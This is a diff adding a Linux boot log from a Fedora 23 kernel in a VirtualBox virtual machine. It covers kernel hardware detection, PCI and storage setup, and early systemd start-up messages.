+Dec 14 01:37:04 localhost kernel: #011RCU restricting CPUs from NR_CPUS=1024 to nr_cpu_ids=2.
+Dec 14 01:37:04 localhost kernel: RCU: Adjusting geometry for rcu_fanout_leaf=64, nr_cpu_ids=2
+Dec 14 01:37:04 localhost kernel: NR_IRQS:65792 nr_irqs:440 16
+Dec 14 01:37:04 localhost kernel: #011Offload RCU callbacks from all CPUs
+Dec 14 01:37:04 localhost kernel: #011Offload RCU callbacks from CPUs: 0-1.
+Dec 14 01:37:04 localhost kernel: Console: colour VGA+ 80x25
+Dec 14 01:37:04 localhost kernel: console [tty0] enabled
+Dec 14 01:37:04 localhost kernel: tsc: Detected 1991.998 MHz processor
+Dec 14 01:37:04 localhost kernel: Calibrating delay loop (skipped) preset value.. 3983.99 BogoMIPS (lpj=1991998)
+Dec 14 01:37:04 localhost kernel: pid_max: default: 32768 minimum: 301
+Dec 14 01:37:04 localhost kernel: ACPI: Core revision 20150619
+Dec 14 01:37:04 localhost kernel: ACPI: All ACPI Tables successfully acquired
+Dec 14 01:37:04 localhost kernel: Security Framework initialized
+Dec 14 01:37:04 localhost kernel: SELinux:  Initializing.
+Dec 14 01:37:04 localhost kernel: SELinux:  Starting in permissive mode
+Dec 14 01:37:04 localhost kernel: Yama: becoming mindful.
+Dec 14 01:37:04 localhost kernel: Dentry cache hash table entries: 131072 (order: 8, 1048576 bytes)
+Dec 14 01:37:04 localhost kernel: Inode-cache hash table entries: 65536 (order: 7, 524288 bytes)
+Dec 14 01:37:04 localhost kernel: Mount-cache hash table entries: 2048 (order: 2, 16384 bytes)
+Dec 14 01:37:04 localhost kernel: Mountpoint-cache hash table entries: 2048 (order: 2, 16384 bytes)
+Dec 14 01:37:04 localhost kernel: Initializing cgroup subsys blkio
+Dec 14 01:37:04 localhost kernel: Initializing cgroup subsys memory
+Dec 14 01:37:04 localhost kernel: Initializing cgroup subsys devices
+Dec 14 01:37:04 localhost kernel: Initializing cgroup subsys freezer
+Dec 14 01:37:04 localhost kernel: Initializing cgroup subsys net_cls
+Dec 14 01:37:04 localhost kernel: Initializing cgroup subsys perf_event
+Dec 14 01:37:04 localhost kernel: Initializing cgroup subsys net_prio
+Dec 14 01:37:04 localhost kernel: Initializing cgroup subsys hugetlb
+Dec 14 01:37:04 localhost kernel: CPU: Physical Processor ID: 0
+Dec 14 01:37:04 localhost kernel: CPU: Processor Core ID: 0
+Dec 14 01:37:04 localhost kernel: mce: CPU supports 0 MCE banks
+Dec 14 01:37:04 localhost kernel: Last level iTLB entries: 4KB 64, 2MB 8, 4MB 8
+Dec 14 01:37:04 localhost kernel: Last level dTLB entries: 4KB 64, 2MB 0, 4MB 0, 1GB 4
+Dec 14 01:37:04 localhost kernel: Freeing SMP alternatives memory: 28K (ffffffff81eb7000 - ffffffff81ebe000)
+Dec 14 01:37:04 localhost kernel: ftrace: allocating 28715 entries in 113 pages
+Dec 14 01:37:04 localhost kernel: ..TIMER: vector=0x30 apic1=0 pin1=2 apic2=-1 pin2=-1
+Dec 14 01:37:04 localhost kernel: smpboot: CPU0: Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz (fam: 06, model: 8e, stepping: 0a)
+Dec 14 01:37:04 localhost kernel: Performance Events: unsupported p6 CPU model 142 no PMU driver, software events only.
+Dec 14 01:37:04 localhost kernel: x86: Booting SMP configuration:
+Dec 14 01:37:04 localhost kernel: .... node  #0, CPUs:      #1
+Dec 14 01:37:04 localhost kernel: kvm-clock: cpu 1, msr 0:2ffcc041, secondary cpu clock
+Dec 14 01:37:04 localhost kernel: mce: CPU supports 0 MCE banks
+Dec 14 01:37:04 localhost kernel: x86: Booted up 1 node, 2 CPUs
+Dec 14 01:37:04 localhost kernel: smpboot: Total of 2 processors activated (7967.99 BogoMIPS)
+Dec 14 01:37:04 localhost kernel: devtmpfs: initialized
+Dec 14 01:37:04 localhost kernel: clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1911260446275000 ns
+Dec 14 01:37:04 localhost kernel: atomic64_test: passed for x86-64 platform with CX8 and with SSE
+Dec 14 01:37:04 localhost kernel: pinctrl core: initialized pinctrl subsystem
+Dec 14 01:37:04 localhost kernel: RTC time:  1:37:04, date: 12/14/19
+Dec 14 01:37:04 localhost kernel: NET: Registered protocol family 16
+Dec 14 01:37:04 localhost kernel: cpuidle: using governor menu
+Dec 14 01:37:04 localhost kernel: ACPI: bus type PCI registered
+Dec 14 01:37:04 localhost kernel: acpiphp: ACPI Hot Plug PCI Controller Driver version: 0.5
+Dec 14 01:37:04 localhost kernel: PCI: Using configuration type 1 for base access
+Dec 14 01:37:04 localhost kernel: ACPI: Added _OSI(Module Device)
+Dec 14 01:37:04 localhost kernel: ACPI: Added _OSI(Processor Device)
+Dec 14 01:37:04 localhost kernel: ACPI: Added _OSI(3.0 _SCP Extensions)
+Dec 14 01:37:04 localhost kernel: ACPI: Added _OSI(Processor Aggregator Device)
+Dec 14 01:37:04 localhost kernel: ACPI: Executed 1 blocks of module-level executable AML code
+Dec 14 01:37:04 localhost kernel: ACPI: Interpreter enabled
+Dec 14 01:37:04 localhost kernel: ACPI Exception: AE_NOT_FOUND, While evaluating Sleep State [\_S1_] (20150619/hwxface-580)
+Dec 14 01:37:04 localhost kernel: ACPI Exception: AE_NOT_FOUND, While evaluating Sleep State [\_S2_] (20150619/hwxface-580)
+Dec 14 01:37:04 localhost kernel: ACPI Exception: AE_NOT_FOUND, While evaluating Sleep State [\_S3_] (20150619/hwxface-580)
+Dec 14 01:37:04 localhost kernel: ACPI Exception: AE_NOT_FOUND, While evaluating Sleep State [\_S4_] (20150619/hwxface-580)
+Dec 14 01:37:04 localhost kernel: ACPI: (supports S0 S5)
+Dec 14 01:37:04 localhost kernel: ACPI: Using IOAPIC for interrupt routing
+Dec 14 01:37:04 localhost kernel: PCI: Using host bridge windows from ACPI; if necessary, use "pci=nocrs" and report a bug
+Dec 14 01:37:04 localhost kernel: ACPI: PCI Root Bridge [PCI0] (domain 0000 [bus 00-ff])
+Dec 14 01:37:04 localhost kernel: acpi PNP0A03:00: _OSC: OS supports [ASPM ClockPM Segments MSI]
+Dec 14 01:37:04 localhost kernel: acpi PNP0A03:00: _OSC: not requesting OS control; OS requires [ExtendedConfig ASPM ClockPM MSI]
+Dec 14 01:37:04 localhost kernel: acpi PNP0A03:00: fail to add MMCONFIG information, can't access extended PCI configuration space under this bridge.
+Dec 14 01:37:04 localhost kernel: PCI host bridge to bus 0000:00
+Dec 14 01:37:04 localhost kernel: pci_bus 0000:00: root bus resource [bus 00-ff]
+Dec 14 01:37:04 localhost kernel: pci_bus 0000:00: root bus resource [io  0x0000-0x0cf7 window]
+Dec 14 01:37:04 localhost kernel: pci_bus 0000:00: root bus resource [io  0x0d00-0xffff window]
+Dec 14 01:37:04 localhost kernel: pci_bus 0000:00: root bus resource [mem 0x000a0000-0x000bffff window]
+Dec 14 01:37:04 localhost kernel: pci_bus 0000:00: root bus resource [mem 0x30000000-0xfdffffff window]
+Dec 14 01:37:04 localhost kernel: pci 0000:00:00.0: [8086:1237] type 00 class 0x060000
+Dec 14 01:37:04 localhost kernel: pci 0000:00:01.0: [8086:7000] type 00 class 0x060100
+Dec 14 01:37:04 localhost kernel: pci 0000:00:01.1: [8086:7111] type 00 class 0x01018a
+Dec 14 01:37:04 localhost kernel: pci 0000:00:01.1: reg 0x20: [io  0xd000-0xd00f]
+Dec 14 01:37:04 localhost kernel: pci 0000:00:01.1: legacy IDE quirk: reg 0x10: [io  0x01f0-0x01f7]
+Dec 14 01:37:04 localhost kernel: pci 0000:00:01.1: legacy IDE quirk: reg 0x14: [io  0x03f6]
+Dec 14 01:37:04 localhost kernel: pci 0000:00:01.1: legacy IDE quirk: reg 0x18: [io  0x0170-0x0177]
+Dec 14 01:37:04 localhost kernel: pci 0000:00:01.1: legacy IDE quirk: reg 0x1c: [io  0x0376]
+Dec 14 01:37:04 localhost kernel: pci 0000:00:02.0: [80ee:beef] type 00 class 0x030000
+Dec 14 01:37:04 localhost kernel: pci 0000:00:02.0: reg 0x10: [mem 0xe0000000-0xe0ffffff pref]
+Dec 14 01:37:04 localhost kernel: pci 0000:00:03.0: [8086:100e] type 00 class 0x020000
+Dec 14 01:37:04 localhost kernel: pci 0000:00:03.0: reg 0x10: [mem 0xf0000000-0xf001ffff]
+Dec 14 01:37:04 localhost kernel: pci 0000:00:03.0: reg 0x18: [io  0xd010-0xd017]
+Dec 14 01:37:04 localhost kernel: pci 0000:00:04.0: [80ee:cafe] type 00 class 0x088000
+Dec 14 01:37:04 localhost kernel: pci 0000:00:04.0: reg 0x10: [io  0xd020-0xd03f]
+Dec 14 01:37:04 localhost kernel: pci 0000:00:04.0: reg 0x14: [mem 0xf0400000-0xf07fffff]
+Dec 14 01:37:04 localhost kernel: pci 0000:00:04.0: reg 0x18: [mem 0xf0800000-0xf0803fff pref]
+Dec 14 01:37:04 localhost kernel: pci 0000:00:05.0: [8086:2415] type 00 class 0x040100
+Dec 14 01:37:04 localhost kernel: pci 0000:00:05.0: reg 0x10: [io  0xd100-0xd1ff]
+Dec 14 01:37:04 localhost kernel: pci 0000:00:05.0: reg 0x14: [io  0xd200-0xd23f]
+Dec 14 01:37:04 localhost kernel: pci 0000:00:06.0: [106b:003f] type 00 class 0x0c0310
+Dec 14 01:37:04 localhost kernel: pci 0000:00:06.0: reg 0x10: [mem 0xf0804000-0xf0804fff]
+Dec 14 01:37:04 localhost kernel: pci 0000:00:07.0: [8086:7113] type 00 class 0x068000
+Dec 14 01:37:04 localhost kernel: pci 0000:00:07.0: quirk: [io  0x4000-0x403f] claimed by PIIX4 ACPI
+Dec 14 01:37:04 localhost kernel: pci 0000:00:07.0: quirk: [io  0x4100-0x410f] claimed by PIIX4 SMB
+Dec 14 01:37:04 localhost kernel: pci 0000:00:08.0: [8086:100e] type 00 class 0x020000
+Dec 14 01:37:04 localhost kernel: pci 0000:00:08.0: reg 0x10: [mem 0xf0820000-0xf083ffff]
+Dec 14 01:37:04 localhost kernel: pci 0000:00:08.0: reg 0x18: [io  0xd240-0xd247]
+Dec 14 01:37:04 localhost kernel: pci 0000:00:0d.0: [8086:2829] type 00 class 0x010601
+Dec 14 01:37:04 localhost kernel: pci 0000:00:0d.0: reg 0x10: [io  0xd248-0xd24f]
+Dec 14 01:37:04 localhost kernel: pci 0000:00:0d.0: reg 0x14: [io  0xd250-0xd253]
+Dec 14 01:37:04 localhost kernel: pci 0000:00:0d.0: reg 0x18: [io  0xd258-0xd25f]
+Dec 14 01:37:04 localhost kernel: pci 0000:00:0d.0: reg 0x1c: [io  0xd260-0xd263]
+Dec 14 01:37:04 localhost kernel: pci 0000:00:0d.0: reg 0x20: [io  0xd270-0xd27f]
+Dec 14 01:37:04 localhost kernel: pci 0000:00:0d.0: reg 0x24: [mem 0xf0840000-0xf0841fff]
+Dec 14 01:37:04 localhost kernel: ACPI: PCI Interrupt Link [LNKA] (IRQs 5 9 10 *11)
+Dec 14 01:37:04 localhost kernel: ACPI: PCI Interrupt Link [LNKB] (IRQs 5 9 *10 11)
+Dec 14 01:37:04 localhost kernel: ACPI: PCI Interrupt Link [LNKC] (IRQs 5 *9 10 11)
+Dec 14 01:37:04 localhost kernel: ACPI: PCI Interrupt Link [LNKD] (IRQs 5 9 10 *11)
+Dec 14 01:37:04 localhost kernel: ACPI: Enabled 2 GPEs in block 00 to 07
+Dec 14 01:37:04 localhost kernel: vgaarb: setting as boot device: PCI:0000:00:02.0
+Dec 14 01:37:04 localhost kernel: vgaarb: device added: PCI:0000:00:02.0,decodes=io+mem,owns=io+mem,locks=none
+Dec 14 01:37:04 localhost kernel: vgaarb: loaded
+Dec 14 01:37:04 localhost kernel: vgaarb: bridge control possible 0000:00:02.0
+Dec 14 01:37:04 localhost kernel: SCSI subsystem initialized
+Dec 14 01:37:04 localhost kernel: libata version 3.00 loaded.
+Dec 14 01:37:04 localhost kernel: ACPI: bus type USB registered
+Dec 14 01:37:04 localhost kernel: usbcore: registered new interface driver usbfs
+Dec 14 01:37:04 localhost kernel: usbcore: registered new interface driver hub
+Dec 14 01:37:04 localhost kernel: usbcore: registered new device driver usb
+Dec 14 01:37:04 localhost kernel: PCI: Using ACPI for IRQ routing
+Dec 14 01:37:04 localhost kernel: PCI: pci_cache_line_size set to 64 bytes
+Dec 14 01:37:04 localhost kernel: e820: reserve RAM buffer [mem 0x0009fc00-0x0009ffff]
+Dec 14 01:37:04 localhost kernel: e820: reserve RAM buffer [mem 0x2fff0000-0x2fffffff]
+Dec 14 01:37:04 localhost kernel: NetLabel: Initializing
+Dec 14 01:37:04 localhost kernel: NetLabel:  domain hash size = 128
+Dec 14 01:37:04 localhost kernel: NetLabel:  protocols = UNLABELED CIPSOv4
+Dec 14 01:37:04 localhost kernel: NetLabel:  unlabeled traffic allowed by default
+Dec 14 01:37:04 localhost kernel: clocksource: Switched to clocksource kvm-clock
+Dec 14 01:37:04 localhost kernel: pnp: PnP ACPI init
+Dec 14 01:37:04 localhost kernel: pnp 00:00: Plug and Play ACPI device, IDs PNP0303 (active)
+Dec 14 01:37:04 localhost kernel: pnp 00:01: Plug and Play ACPI device, IDs PNP0f03 (active)
+Dec 14 01:37:04 localhost kernel: pnp: PnP ACPI: found 2 devices
+Dec 14 01:37:04 localhost kernel: clocksource: acpi_pm: mask: 0xffffff max_cycles: 0xffffff, max_idle_ns: 2085701024 ns
+Dec 14 01:37:04 localhost kernel: pci_bus 0000:00: resource 4 [io  0x0000-0x0cf7 window]
+Dec 14 01:37:04 localhost kernel: pci_bus 0000:00: resource 5 [io  0x0d00-0xffff window]
+Dec 14 01:37:04 localhost kernel: pci_bus 0000:00: resource 6 [mem 0x000a0000-0x000bffff window]
+Dec 14 01:37:04 localhost kernel: pci_bus 0000:00: resource 7 [mem 0x30000000-0xfdffffff window]
+Dec 14 01:37:04 localhost kernel: NET: Registered protocol family 2
+Dec 14 01:37:04 localhost kernel: TCP established hash table entries: 8192 (order: 4, 65536 bytes)
+Dec 14 01:37:04 localhost kernel: TCP bind hash table entries: 8192 (order: 5, 131072 bytes)
+Dec 14 01:37:04 localhost kernel: TCP: Hash tables configured (established 8192 bind 8192)
+Dec 14 01:37:04 localhost kernel: UDP hash table entries: 512 (order: 2, 16384 bytes)
+Dec 14 01:37:04 localhost kernel: UDP-Lite hash table entries: 512 (order: 2, 16384 bytes)
+Dec 14 01:37:04 localhost kernel: NET: Registered protocol family 1
+Dec 14 01:37:04 localhost kernel: pci 0000:00:00.0: Limiting direct PCI/PCI transfers
+Dec 14 01:37:04 localhost kernel: pci 0000:00:01.0: Activating ISA DMA hang workarounds
+Dec 14 01:37:04 localhost kernel: pci 0000:00:02.0: Video device with shadowed ROM
+Dec 14 01:37:04 localhost kernel: PCI: CLS 0 bytes, default 64
+Dec 14 01:37:04 localhost kernel: Unpacking initramfs...
+Dec 14 01:37:04 localhost kernel: Freeing initrd memory: 18492K (ffff88002e64c000 - ffff88002f85b000)
+Dec 14 01:37:04 localhost kernel: platform rtc_cmos: registered platform RTC device (no PNP device found)
+Dec 14 01:37:04 localhost kernel: microcode: CPU0 sig=0x806ea, pf=0x2, revision=0x0
+Dec 14 01:37:04 localhost kernel: microcode: CPU1 sig=0x806ea, pf=0x2, revision=0x0
+Dec 14 01:37:04 localhost kernel: microcode: Microcode Update Driver: v2.00 <tigran@aivazian.fsnet.co.uk>, Peter Oruba
+Dec 14 01:37:04 localhost kernel: futex hash table entries: 512 (order: 3, 32768 bytes)
+Dec 14 01:37:04 localhost kernel: Initialise system trusted keyring
+Dec 14 01:37:04 localhost kernel: audit: initializing netlink subsys (disabled)
+Dec 14 01:37:04 localhost kernel: audit: type=2000 audit(1576287428.568:1): initialized
+Dec 14 01:37:04 localhost kernel: HugeTLB registered 2 MB page size, pre-allocated 0 pages
+Dec 14 01:37:04 localhost kernel: zpool: loaded
+Dec 14 01:37:04 localhost kernel: zbud: loaded
+Dec 14 01:37:04 localhost kernel: VFS: Disk quotas dquot_6.6.0
+Dec 14 01:37:04 localhost kernel: VFS: Dquot-cache hash table entries: 512 (order 0, 4096 bytes)
+Dec 14 01:37:04 localhost kernel: Key type big_key registered
+Dec 14 01:37:04 localhost kernel: SELinux:  Registering netfilter hooks
+Dec 14 01:37:04 localhost kernel: NET: Registered protocol family 38
+Dec 14 01:37:04 localhost kernel: Key type asymmetric registered
+Dec 14 01:37:04 localhost kernel: Asymmetric key parser 'x509' registered
+Dec 14 01:37:04 localhost kernel: Block layer SCSI generic (bsg) driver version 0.4 loaded (major 250)
+Dec 14 01:37:04 localhost kernel: io scheduler noop registered
+Dec 14 01:37:04 localhost kernel: io scheduler deadline registered
+Dec 14 01:37:04 localhost kernel: io scheduler cfq registered (default)
+Dec 14 01:37:04 localhost kernel: pci_hotplug: PCI Hot Plug PCI Core version: 0.5
+Dec 14 01:37:04 localhost kernel: pciehp: PCI Express Hot Plug Controller Driver version: 0.4
+Dec 14 01:37:04 localhost kernel: intel_idle: does not run on family 6 model 142
+Dec 14 01:37:04 localhost kernel: ACPI: AC Adapter [AC] (on-line)
+Dec 14 01:37:04 localhost kernel: input: Power Button as /devices/LNXSYSTM:00/LNXPWRBN:00/input/input0
+Dec 14 01:37:04 localhost kernel: ACPI: Power Button [PWRF]
+Dec 14 01:37:04 localhost kernel: input: Sleep Button as /devices/LNXSYSTM:00/LNXSLPBN:00/input/input1
+Dec 14 01:37:04 localhost kernel: ACPI: Sleep Button [SLPF]
+Dec 14 01:37:04 localhost kernel: GHES: HEST is not enabled!
+Dec 14 01:37:04 localhost kernel: Serial: 8250/16550 driver, 4 ports, IRQ sharing enabled
+Dec 14 01:37:04 localhost kernel: Non-volatile memory driver v1.3
+Dec 14 01:37:04 localhost kernel: Linux agpgart interface v0.103
+Dec 14 01:37:04 localhost kernel: ACPI: Battery Slot [BAT0] (battery present)
+Dec 14 01:37:04 localhost kernel: ahci 0000:00:0d.0: version 3.0
+Dec 14 01:37:04 localhost kernel: ahci 0000:00:0d.0: SSS flag set, parallel bus scan disabled
+Dec 14 01:37:04 localhost kernel: ahci 0000:00:0d.0: AHCI 0001.0100 32 slots 1 ports 3 Gbps 0x1 impl SATA mode
+Dec 14 01:37:04 localhost kernel: ahci 0000:00:0d.0: flags: 64bit ncq stag only ccc 
+Dec 14 01:37:04 localhost kernel: scsi host0: ahci
+Dec 14 01:37:04 localhost kernel: ata1: SATA max UDMA/133 abar m8192@0xf0840000 port 0xf0840100 irq 21
+Dec 14 01:37:04 localhost kernel: ata_piix 0000:00:01.1: version 2.13
+Dec 14 01:37:04 localhost kernel: scsi host1: ata_piix
+Dec 14 01:37:04 localhost kernel: scsi host2: ata_piix
+Dec 14 01:37:04 localhost kernel: ata2: PATA max UDMA/33 cmd 0x1f0 ctl 0x3f6 bmdma 0xd000 irq 14
+Dec 14 01:37:04 localhost kernel: ata3: PATA max UDMA/33 cmd 0x170 ctl 0x376 bmdma 0xd008 irq 15
+Dec 14 01:37:04 localhost kernel: libphy: Fixed MDIO Bus: probed
+Dec 14 01:37:04 localhost kernel: ehci_hcd: USB 2.0 'Enhanced' Host Controller (EHCI) Driver
+Dec 14 01:37:04 localhost kernel: ehci-pci: EHCI PCI platform driver
+Dec 14 01:37:04 localhost kernel: ohci_hcd: USB 1.1 'Open' Host Controller (OHCI) Driver
+Dec 14 01:37:04 localhost kernel: ohci-pci: OHCI PCI platform driver
+Dec 14 01:37:04 localhost kernel: ohci-pci 0000:00:06.0: OHCI PCI host controller
+Dec 14 01:37:04 localhost kernel: ohci-pci 0000:00:06.0: new USB bus registered, assigned bus number 1
+Dec 14 01:37:04 localhost kernel: ohci-pci 0000:00:06.0: irq 22, io mem 0xf0804000
+Dec 14 01:37:04 localhost kernel: usb usb1: New USB device found, idVendor=1d6b, idProduct=0001
+Dec 14 01:37:04 localhost kernel: usb usb1: New USB device strings: Mfr=3, Product=2, SerialNumber=1
+Dec 14 01:37:04 localhost kernel: usb usb1: Product: OHCI PCI host controller
+Dec 14 01:37:04 localhost kernel: usb usb1: Manufacturer: Linux 4.2.3-300.fc23.x86_64 ohci_hcd
+Dec 14 01:37:04 localhost kernel: usb usb1: SerialNumber: 0000:00:06.0
+Dec 14 01:37:04 localhost kernel: hub 1-0:1.0: USB hub found
+Dec 14 01:37:04 localhost kernel: hub 1-0:1.0: 12 ports detected
+Dec 14 01:37:04 localhost kernel: uhci_hcd: USB Universal Host Controller Interface driver
+Dec 14 01:37:04 localhost kernel: usbcore: registered new interface driver usbserial
+Dec 14 01:37:04 localhost kernel: usbcore: registered new interface driver usbserial_generic
+Dec 14 01:37:04 localhost kernel: usbserial: USB Serial support registered for generic
+Dec 14 01:37:04 localhost kernel: i8042: PNP: PS/2 Controller [PNP0303:PS2K,PNP0f03:PS2M] at 0x60,0x64 irq 1,12
+Dec 14 01:37:04 localhost kernel: serio: i8042 KBD port at 0x60,0x64 irq 1
+Dec 14 01:37:04 localhost kernel: serio: i8042 AUX port at 0x60,0x64 irq 12
+Dec 14 01:37:04 localhost kernel: mousedev: PS/2 mouse device common for all mice
+Dec 14 01:37:04 localhost kernel: input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input2
+Dec 14 01:37:04 localhost kernel: rtc_cmos rtc_cmos: rtc core: registered rtc_cmos as rtc0
+Dec 14 01:37:04 localhost kernel: rtc_cmos rtc_cmos: alarms up to one day, 114 bytes nvram
+Dec 14 01:37:04 localhost kernel: device-mapper: uevent: version 1.0.3
+Dec 14 01:37:04 localhost kernel: device-mapper: ioctl: 4.33.0-ioctl (2015-8-18) initialised: dm-devel@redhat.com
+Dec 14 01:37:04 localhost kernel: hidraw: raw HID events driver (C) Jiri Kosina
+Dec 14 01:37:04 localhost kernel: usbcore: registered new interface driver usbhid
+Dec 14 01:37:04 localhost kernel: usbhid: USB HID core driver
+Dec 14 01:37:04 localhost kernel: drop_monitor: Initializing network drop monitor service
+Dec 14 01:37:04 localhost kernel: ip_tables: (C) 2000-2006 Netfilter Core Team
+Dec 14 01:37:04 localhost kernel: Initializing XFRM netlink socket
+Dec 14 01:37:04 localhost kernel: NET: Registered protocol family 10
+Dec 14 01:37:04 localhost kernel: mip6: Mobile IPv6
+Dec 14 01:37:04 localhost kernel: NET: Registered protocol family 17
+Dec 14 01:37:04 localhost kernel: AVX2 version of gcm_enc/dec engaged.
+Dec 14 01:37:04 localhost kernel: AES CTR mode by8 optimization enabled
+Dec 14 01:37:04 localhost kernel: Loading compiled-in X.509 certificates
+Dec 14 01:37:04 localhost kernel: Loaded X.509 cert 'Fedora kernel signing key: 7f1e7775d7634112359e58508de48fd4cfce0fb6'
+Dec 14 01:37:04 localhost kernel: registered taskstats version 1
+Dec 14 01:37:04 localhost kernel: zswap: loading zswap
+Dec 14 01:37:04 localhost kernel: zswap: using zbud pool
+Dec 14 01:37:04 localhost kernel: zswap: using lzo compressor
+Dec 14 01:37:04 localhost kernel:  Magic number: 15:771:609
+Dec 14 01:37:04 localhost kernel: node node0: hash matches
+Dec 14 01:37:04 localhost kernel: rtc_cmos rtc_cmos: setting system clock to 2019-12-14 01:37:04 UTC (1576287424)
+Dec 14 01:37:04 localhost kernel: PM: Hibernation image not present or could not be loaded.
+Dec 14 01:37:04 localhost kernel: ata3.00: ATAPI: VBOX CD-ROM, 1.0, max UDMA/133
+Dec 14 01:37:04 localhost kernel: ata3.00: configured for UDMA/33
+Dec 14 01:37:04 localhost kernel: input: ImExPS/2 Generic Explorer Mouse as /devices/platform/i8042/serio1/input/input4
+Dec 14 01:37:04 localhost kernel: ata1: SATA link up 3.0 Gbps (SStatus 123 SControl 300)
+Dec 14 01:37:04 localhost kernel: ata1.00: ATA-6: VBOX HARDDISK, 1.0, max UDMA/133
+Dec 14 01:37:04 localhost kernel: ata1.00: 16777216 sectors, multi 128: LBA48 NCQ (depth 31/32)
+Dec 14 01:37:04 localhost kernel: ata1.00: configured for UDMA/133
+Dec 14 01:37:04 localhost kernel: scsi 0:0:0:0: Direct-Access     ATA      VBOX HARDDISK    1.0  PQ: 0 ANSI: 5
+Dec 14 01:37:04 localhost kernel: sd 0:0:0:0: Attached scsi generic sg0 type 0
+Dec 14 01:37:04 localhost kernel: sd 0:0:0:0: [sda] 16777216 512-byte logical blocks: (8.58 GB/8.00 GiB)
+Dec 14 01:37:04 localhost kernel: sd 0:0:0:0: [sda] Write Protect is off
+Dec 14 01:37:04 localhost kernel: sd 0:0:0:0: [sda] Mode Sense: 00 3a 00 00
+Dec 14 01:37:04 localhost kernel: sd 0:0:0:0: [sda] Write cache: enabled, read cache: enabled, doesn't support DPO or FUA
+Dec 14 01:37:04 localhost kernel: sda: sda1 sda2
+Dec 14 01:37:04 localhost kernel: scsi 2:0:0:0: CD-ROM            VBOX     CD-ROM           1.0  PQ: 0 ANSI: 5
+Dec 14 01:37:04 localhost kernel: sd 0:0:0:0: [sda] Attached SCSI disk
+Dec 14 01:37:04 localhost kernel: sr 2:0:0:0: [sr0] scsi3-mmc drive: 32x/32x xa/form2 tray
+Dec 14 01:37:04 localhost kernel: cdrom: Uniform CD-ROM driver Revision: 3.20
+Dec 14 01:37:04 localhost kernel: sr 2:0:0:0: Attached scsi CD-ROM sr0
+Dec 14 01:37:04 localhost kernel: sr 2:0:0:0: Attached scsi generic sg1 type 5
+Dec 14 01:37:04 localhost kernel: Freeing unused kernel memory: 1508K (ffffffff81d3e000 - ffffffff81eb7000)
+Dec 14 01:37:04 localhost kernel: Write protecting the kernel read-only data: 12288k
+Dec 14 01:37:04 localhost kernel: Freeing unused kernel memory: 512K (ffff880001780000 - ffff880001800000)
+Dec 14 01:37:04 localhost kernel: Freeing unused kernel memory: 760K (ffff880001b42000 - ffff880001c00000)
+Dec 14 01:37:04 localhost kernel: random: systemd urandom read with 18 bits of entropy available
+Dec 14 01:37:04 localhost systemd[1]: systemd 222 running in system mode. (+PAM +AUDIT +SELINUX +IMA -APPARMOR +SMACK +SYSVINIT +UTMP +LIBCRYPTSETUP +GCRYPT +GNUTLS +ACL +XZ -LZ4 +SECCOMP +BLKID +ELFUTILS +KMOD +IDN)
+Dec 14 01:37:04 localhost systemd[1]: Detected virtualization oracle.
+Dec 14 01:37:04 localhost systemd[1]: Detected architecture x86-64.
+Dec 14 01:37:04 localhost systemd[1]: Running in initial RAM disk.
+Dec 14 01:37:04 localhost systemd[1]: Set hostname to <localhost.localdomain>.
+Dec 14 01:37:04 localhost systemd[1]: Created slice -.slice.
+Dec 14 01:37:04 localhost systemd[1]: Starting -.slice.
+Dec 14 01:37:04 localhost systemd[1]: Created slice System Slice.
+Dec 14 01:37:04 localhost systemd[1]: Starting System Slice.
+Dec 14 01:37:04 localhost systemd[1]: Reached target Timers.
+Dec 14 01:37:04 localhost systemd[1]: Starting Timers.
+Dec 14 01:37:04 localhost systemd[1]: Reached target Swap.
+Dec 14 01:37:04 localhost systemd[1]: Starting Swap.
+Dec 14 01:37:04 localhost systemd[1]: Reached target Local File Systems.
+Dec 14 01:37:04 localhost systemd[1]: Starting Local File Systems.
+Dec 14 01:37:04 localhost systemd[1]: Reached target Slices.
+Dec 14 01:37:04 localhost systemd[1]: Starting Slices.
+Dec 14 01:37:04 localhost systemd[1]: Listening on Journal Socket.
+Dec 14 01:37:04 localhost systemd[1]: Starting Journal Socket.
+Dec 14 01:37:04 localhost systemd[1]: Starting Setup Virtual Console...
+Dec 14 01:37:04 localhost systemd[1]: Started Load Kernel Modules.
+Dec 14 01:37:04 localhost systemd[1]: Starting Create list of required static device nodes for the current kernel...
+Dec 14 01:37:04 localhost systemd[1]: Started dracut ask for additional cmdline parameters.
+Dec 14 01:37:04 localhost systemd[1]: Listening on udev Control Socket.
+Dec 14 01:37:04 localhost systemd[1]: Starting udev Control Socket.
+Dec 14 01:37:04 localhost systemd[1]: Starting dracut cmdline hook...
+Dec 14 01:37:04 localhost systemd[1]: Listening on udev Kernel Socket.
+Dec 14 01:37:04 localhost systemd[1]: Starting udev Kernel Socket.
+Dec 14 01:37:04 localhost systemd[1]: Listening on Journal Socket (/dev/log).
+Dec 14 01:37:04 localhost systemd[1]: Starting Journal Socket (/dev/log).
+Dec 14 01:37:04 localhost systemd[1]: Listening on Journal Audit Socket.
+Dec 14 01:37:04 localhost systemd[1]: Starting Journal Audit Socket.
+Dec 14 01:37:04 localhost systemd[1]: Reached target Sockets.
+Dec 14 01:37:04 localhost systemd[1]: Starting Sockets.
+Dec 14 01:37:04 localhost systemd[1]: Starting Journal Service...
+Dec 14 01:37:04 localhost systemd[1]: Starting Apply Kernel Variables...
+Dec 14 01:37:04 localhost journal: Journal started
+Dec 14 01:37:04 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=kmod-static-nodes comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:04 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=systemd-journald comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:04 localhost systemd: Starting Create Static Device Nodes in /dev...
+Dec 14 01:37:04 localhost systemd: Started Apply Kernel Variables.
+Dec 14 01:37:04 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 subj=kernel msg='unit=systemd-sysctl comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:04 localhost systemd: Started Create Static Device Nodes in /dev.
